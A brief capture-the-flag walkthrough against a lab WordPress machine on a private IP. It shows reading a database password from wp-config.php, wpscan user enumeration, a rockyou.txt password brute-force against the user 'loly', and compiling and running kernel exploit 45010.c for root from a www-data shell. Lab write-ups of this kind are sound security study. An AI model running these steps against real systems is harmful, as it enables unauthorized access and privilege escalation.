since it is wp, so we need check wp-config.php

/** MySQL database password */
define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );

after upload, it told file inside banners, it means
/wordpress/wp-content/banners

```

wpscan --url http://192.168.137.147/wordpress --enumerate u
```
find user

```
wpscan --url http://192.168.137.147/wordpress --passwords /usr/share/wordlists/rockyou.txt --usernames loly
```
find pw

uname -a
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

this is a old one, so we can exploit kernel , 45010.c will work

www-data@ubuntu:/tmp$ gcc 45010.c -o privesc  
gcc 45010.c -o privesc  
gcc: error trying to exec 'cc1': execvp: No such file or directory  
www-data@ubuntu:/tmp$ find /usr -name cc1  
find /usr -name cc1  
/usr/lib/gcc/x86_64-linux-gnu/5/cc1  
www-data@ubuntu:/tmp$ export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/5/cc1  
export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/5/cc1  
www-data@ubuntu:/tmp$ gcc 45010.c -o privesc  
gcc 45010.c -o privesc  
www-data@ubuntu:/tmp$ ./privesc

